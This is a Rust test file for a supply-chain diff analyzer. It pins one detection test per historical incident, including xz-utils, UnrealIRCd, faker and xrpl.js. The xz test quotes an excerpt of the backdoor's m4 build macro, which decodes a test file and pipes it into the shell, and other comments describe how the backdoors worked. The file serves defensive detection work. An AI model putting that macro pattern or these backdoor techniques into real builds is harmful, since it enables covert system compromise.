//! Known supply-chain incidents, one regression test each.
//!
//! The rules elsewhere are written as generic shapes, so that they catch the
//! next attack rather than the last one, and their comments say what the shape
//! is. The incident that taught each shape lives here instead: what happened,
//! what isomer reads in it, and an assertion that it still does. Each case is
//! the incident's distinguishing differential reduced to synthetic records —
//! no corpus, model, network or trait checkout — so a rule change that would
//! forget one fails `cargo test`, not a release-day audit.
//!
//! Some lessons are pinned next to the code they constrain instead, because
//! they test a private step: `evidence::tests::
//! unrealircd_sub_notable_added_line_survives_the_cull` and `evidence::tests::
//! evidence_keeps_one_window_per_rule_id_not_per_description` (unrealircd),
//! and `deps::tests::dependency_fetch_only_pins_exact_versions`
//! (event-stream).

use std::collections::HashSet;
use std::path::Path;

use cleave::Criticality;
use cleave::types::{
    Changed, DiffReportV1, DiffSummary, FileDiffEntry, FileStatus, KvChange, ScopeDiff, ScopeDiffs,
    ScopeRocs,
};

use super::detectors::{
    change_shape_escalation_for, changed_test_carrier, source_build_macro_score,
};
use super::verdict::skew_note;
use super::{Analysis, Verb};
use crate::Severity;
use crate::options::Options;
use crate::rubric::{Assessment, FactKind, FactLabel, assess};
use crate::testkit::{entry, finding};
use crate::version::{Bump, BumpKind};

/// A member that gained `traits`, each at `crit`.
fn gained(path: &str, file_type: &str, traits: &[(&str, Criticality)]) -> FileDiffEntry {
    FileDiffEntry {
        scopes: ScopeDiffs {
            traits: Some(ScopeDiff {
                added: traits.iter().map(|&(id, crit)| finding(id, crit)).collect(),
                ..Default::default()
            }),
            ..Default::default()
        },
        ..entry(path, file_type, FileStatus::Changed)
    }
}

/// `files` as a compact patch: a handful touched, a hundred untouched.
fn compact(files: Vec<FileDiffEntry>) -> DiffReportV1 {
    DiffReportV1 {
        old_root: "before.tgz".to_owned(),
        new_root: "after.tgz".to_owned(),
        summary: DiffSummary {
            files_added: 2,
            files_changed: 4,
            files_unchanged: 100,
            overall_roc: 0.12,
            scope_roc: ScopeRocs {
                traits: 0.12,
                ..Default::default()
            },
            ..Default::default()
        },
        files,
        scopes: ScopeDiffs::default(),
    }
}

fn shape(diff: &DiffReportV1, kind: BumpKind) -> Severity {
    change_shape_escalation_for(
        &assess(diff, &HashSet::new()),
        diff,
        Some(Bump::new(kind, 1)),
        false,
        false,
        &HashSet::new(),
    )
}

/// Judge `diff` as `isomer fs old new` would, offline, and hand the analysis
/// to `check`.
fn judged<R>(
    old: &str,
    new: &str,
    diff: DiffReportV1,
    check: impl FnOnce(&Analysis<'_>) -> R,
) -> R {
    let mut report: cleave::AnalysisReport =
        serde_json::from_value(serde_json::json!({"version": "3"})).unwrap();
    report.diff = Some(diff);
    let options = cleave::AnalysisOptions::default();
    let opts = Options {
        offline: true,
        ..Options::default()
    };
    let mut a = Analysis::new(
        Verb::Fs,
        Path::new(old),
        Path::new(new),
        &options,
        &report,
        &opts,
    )
    .unwrap();
    a.finish(&opts);
    check(&a)
}

fn fact_names(a: &Assessment, label: FactLabel, kind: FactKind) -> Vec<String> {
    a.structure
        .facts
        .iter()
        .filter(|f| f.label == label && f.kind == kind)
        .flat_map(|f| f.facts.iter().map(|(_, names)| names.clone()))
        .collect()
}

// ── xz-utils 5.6.0 / 5.6.1 (CVE-2024-3094) ─────────────────────────────────

/// A maintainer with two years of commit history shipped a backdoor in the
/// release tarballs of xz-utils 5.6.0 and 5.6.1. Through `systemd`, it hooked
/// OpenSSH's RSA verification. No signature existed on release day. What the
/// binary could not hide is that a compression library suddenly linked the
/// dynamic loader itself and turned its CRC functions into ifunc resolvers,
/// which is how the hook ran before `main`.
#[test]
fn xz_utils_5_6_0_liblzma_gains_loader_tells() {
    let mut liblzma = entry("<root>", "elf", FileStatus::Changed);
    liblzma.scopes.kv = Some(ScopeDiff {
        added: [
            "elf.needed[]=ld-linux-x86-64.so.2",
            "elf.ifuncs[]=lzma_crc32",
            "elf.ifuncs[]=lzma_crc64",
        ]
        .into_iter()
        .map(|path| KvChange {
            path: path.to_owned(),
            value: serde_json::json!(path.rsplit('=').next()),
            ..Default::default()
        })
        .collect(),
        ..Default::default()
    });
    let a = assess(&compact(vec![liblzma]), &HashSet::new());
    assert_eq!(a.structure.severity(), Severity::High);
    assert_eq!(
        fact_names(&a, FactLabel::LoaderDependency, FactKind::Added),
        ["ld-linux-x86-64.so.2"]
    );
    assert_eq!(
        fact_names(&a, FactLabel::IfuncResolvers, FactKind::Added),
        ["lzma_crc32 · lzma_crc64"]
    );
}

/// The payload never touched git. The release tarball's
/// `m4/build-to-host.m4` found a "corrupt" test file, rewrote it with `tr`,
/// decompressed it, and piped the result into the shell during `configure`.
/// 5.6.1 refreshed that hidden stage in the test files and left the macro as
/// it was.
/// Both halves are read here: the macro's joined execution clues, and a
/// compressed file under `tests/` that changed.
#[test]
fn xz_utils_5_6_0_build_macro_decodes_and_runs_a_test_file() {
    let build_to_host = b"gl_am_configmake=`grep -aErls \"#{4}[[:alnum:]]{5}#{4}$\" $srcdir/ 2>/dev/null`\n\
        gl_path_map='tr \"\\t \\-_\" \" \\t_\\-\"'\n\
        gl_[$1]_config='sed \\\"r\\n\\\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'\n\
        AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_$1 | $SHELL 2>/dev/null], [gl_config_$1='$gl_[$1]_config'])";
    assert!(source_build_macro_score(build_to_host));
    for carrier in [
        "<root>!!xz-5.6.1/tests/files/bad-3-corrupt_lzma2.xz",
        "<root>!!xz-5.6.1/tests/files/good-large_compressed.lzma",
    ] {
        assert!(
            changed_test_carrier(&entry(carrier, "", FileStatus::Changed)),
            "{carrier}"
        );
    }
}

/// The implant moved 98% of liblzma's behavior on a 21% content change. A
/// rewrite moves both together. The skew read is calibrated between the two:
/// it fires at three times the content movement, which the xz release clears
/// and a rewrite at twice does not.
#[test]
fn xz_utils_5_6_0_behavior_outran_content() {
    let skewed = |traits: f32, content: f32| {
        let mut diff = compact(vec![gained(
            "<root>",
            "elf",
            &[
                (
                    "micro-behaviors/process/create/shell::spawn-shell",
                    Criticality::Suspicious,
                ),
                (
                    "objectives/evasion/hide/hook::symbol-hook",
                    Criticality::Suspicious,
                ),
            ],
        )]);
        diff.summary.scope_roc.traits = traits;
        diff.summary.scope_roc.metrics = content;
        let a = assess(&diff, &HashSet::new());
        skew_note(&a, &diff)
    };
    assert!(skewed(0.98, 0.21).is_some());
    assert!(skewed(0.50, 0.25).is_none());
}

// ── UnrealIRCd 3.2.8.1 (2010) ──────────────────────────────────────────────

/// The project's download mirrors served a replaced `Unreal3.2.8.1.tar.gz`
/// for seven months: same name, same version, one extra `#define` in
/// `struct.h` and one extra branch in `s_bsd.c` that passed any line starting
/// `AB` to `system()`. A repack that claims to be the release it replaces has
/// no budget for new behavior at all, so beyond the backdoor's own traits the
/// gain is also reported as disproportionate to a same-version change.
#[test]
fn unrealircd_3_2_8_1_backdoored_repack_is_hostile_and_disproportionate() {
    let mut diff = crate::testkit::diff(vec![
        entry("<root>", "tar", FileStatus::Changed),
        gained(
            "<root>!!Unreal3.2/src/s_bsd.c",
            "c",
            &[
                (
                    "objectives/command-and-control/backdoor/dispatch/shell/source::prefix-to-system",
                    Criticality::Hostile,
                ),
                (
                    "micro-behaviors/process/create/shell/native::system",
                    Criticality::Suspicious,
                ),
            ],
        ),
    ]);
    // A surgical edit: most of the behavior moved, almost none of the content.
    diff.summary.overall_roc = 0.15;
    diff.summary.scope_roc.traits = 0.57;
    diff.summary.scope_roc.metrics = 0.004;
    judged(
        "Unreal3.2.8.1.tar.gz",
        "Unreal3.2.8.1_backdoor.tar.gz",
        diff,
        |a| {
            assert_eq!(a.verdict, Severity::Critical);
            assert!(!a.clean());
            let note = a.prop.drift.escalation_note().unwrap_or_default();
            assert!(note.contains("same version"), "{note}");
        },
    );
}

// ── faker 6.6.6 (January 2022) ──────────────────────────────────────────────

/// The maintainer published faker 6.6.6 as a sabotaged release: the library
/// deleted, a README and a near-empty package left behind. No single trait
/// fires on code that is no longer there, so the verdict comes from the shape
/// alone, and the masthead has to say so too. Once, the gate failed while the
/// masthead still read NOTABLE.
#[test]
fn faker_6_6_6_endgame_deletion_reads_hostile_in_the_masthead() {
    let mut files = vec![
        entry("<root>", "npm", FileStatus::Changed),
        entry("<root>!!package/package.json", "json", FileStatus::Changed),
    ];
    files.extend((0..150).map(|n| {
        entry(
            format!("<root>!!package/lib/locales/l{n}.js"),
            "javascript",
            FileStatus::Removed,
        )
    }));
    let mut diff = crate::testkit::diff(files);
    diff.summary.overall_roc = 0.90;
    diff.summary.scope_roc.traits = 0.95;
    judged("faker-5.5.3.tgz", "faker-6.6.6.tgz", diff, |a| {
        assert!(a.verdict >= Severity::High, "masthead reads {}", a.verdict);
        assert_eq!(a.gated(), a.verdict);
        assert!(!a.clean());
    });
}

// ── tj-actions/changed-files (March 2025, CVE-2025-30066) ──────────────────

/// An attacker with a stolen token repointed every version tag of
/// `tj-actions/changed-files` to a commit that printed CI secrets into public
/// build logs. Workflows on a tag ran it without changing a line, and only a
/// commit-SHA pin was immune. isomer cannot see a tag move in someone else's
/// repository, so it reports what a pull request can show: a third-party
/// action newly referenced or moved to another ref, marked when the ref is a
/// mutable tag.
#[test]
fn tj_actions_changed_files_unpinned_refs_are_reported() {
    let uses = |value: &str| KvChange {
        path: "jobs.build.steps[1].uses".to_owned(),
        value: serde_json::json!(value),
        ..Default::default()
    };
    let pinned = "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683";
    let mut workflow = entry(
        "<root>!!.github/workflows/ci.yml",
        "yaml",
        FileStatus::Changed,
    );
    workflow.scopes.kv = Some(ScopeDiff {
        added: vec![KvChange {
            path: "jobs.build.steps[0].uses".to_owned(),
            ..uses(pinned)
        }],
        changed: vec![Changed {
            old: uses("tj-actions/changed-files@v44"),
            new: uses("tj-actions/changed-files@v45"),
        }],
        ..Default::default()
    });
    let a = assess(&compact(vec![workflow]), &HashSet::new());
    assert_eq!(
        fact_names(&a, FactLabel::GithubAction, FactKind::Became),
        ["tj-actions/changed-files@v45 (unpinned)"]
    );
    assert_eq!(
        fact_names(&a, FactLabel::GithubAction, FactKind::Added),
        [pinned]
    );
}

// ── event-stream 3.3.6 (2018) and node-ipc (2022) ──────────────────────────

/// event-stream 3.3.6 added `flatmap-stream`, whose next release carried a
/// payload aimed at one bitcoin wallet. node-ipc's 2022 protestware releases
/// added `peacenotwar`. In both, the package's own code barely moved. The
/// new runtime dependency was the event, so it is always reported. It stays at
/// Medium, below the default `--fail-on high`, because an ordinary release
/// adds dependencies too. `--deps` profiles what the dependency does.
#[test]
fn event_stream_and_node_ipc_new_runtime_dependencies_are_reported() {
    let mut manifest = entry("<root>!!package/package.json", "json", FileStatus::Changed);
    manifest.scopes.kv = Some(ScopeDiff {
        added: [
            ("dependencies.flatmap-stream", "^0.1.0"),
            ("dependencies.peacenotwar", "^9.1.3"),
            ("devDependencies.mocha", "^10.0.0"),
        ]
        .into_iter()
        .map(|(path, spec)| KvChange {
            path: path.to_owned(),
            value: serde_json::json!(spec),
            ..Default::default()
        })
        .collect(),
        ..Default::default()
    });
    let a = assess(&compact(vec![manifest]), &HashSet::new());
    assert_eq!(
        fact_names(&a, FactLabel::Dependency, FactKind::Added),
        ["flatmap-stream · peacenotwar"]
    );
    assert_eq!(a.structure.severity(), Severity::Medium);
}

// ── OpenX 2.8.10 (2012) ────────────────────────────────────────────────────

/// The OpenX ad server shipped for months with a PHP backdoor inside a file
/// named like a minified JavaScript library (`flowplayer-3.1.1.min.js`, in a
/// bundled plugin) — packaging no one reads, below the code people review. No one leg is unusual. Together, in one nested
/// member, they are a payload: it conceals or decodes, it evaluates, and it
/// reaches the network or the filesystem.
#[test]
fn openx_payload_one_archive_layer_down_is_high() {
    let payload = gained(
        "<root>!!openx/plugins/deliveryLog.zip!!flowplayer-3.1.1.min.js",
        "javascript",
        &[
            (
                "objectives/anti-static/obfuscation/encoding::base64-blob",
                Criticality::Notable,
            ),
            (
                "micro-behaviors/process/interpreter/eval::php-eval",
                Criticality::Notable,
            ),
            (
                "micro-behaviors/fs/write/content::file-put-contents",
                Criticality::Notable,
            ),
        ],
    );
    assert_eq!(
        shape(&compact(vec![payload]), BumpKind::Patch),
        Severity::High
    );
}

// ── xrpl.js 2.14.2 (April 2025) ────────────────────────────────────────────

/// A compromised npm publishing account put out xrpl.js releases, 2.14.2
/// among them, that sent wallet seeds to an attacker's host. Every leg — wallet material, encoding,
/// a remote host — is an XRP Ledger client's ordinary job, and 2.14.1 → 4.2.0
/// satisfies all of them legitimately across two majors. The same
/// conjunction in a release that promised nothing new is the signal.
#[test]
fn xrpl_js_2_14_2_key_exfiltration_patch_is_high_but_a_major_upgrade_is_not() {
    let client = compact(vec![gained(
        "<root>!!package/dist/wallet.js",
        "javascript",
        &[
            (
                "micro-behaviors/crypto/library/blockchain/wallet::renamed-wallet-api",
                Criticality::Notable,
            ),
            (
                "micro-behaviors/data/encode/base64::encode",
                Criticality::Notable,
            ),
            (
                "micro-behaviors/communications/http/url/domain::js-remote-host-url",
                Criticality::Notable,
            ),
        ],
    )]);
    assert_eq!(shape(&client, BumpKind::Patch), Severity::High);
    assert_eq!(shape(&client, BumpKind::Major), Severity::None);
}
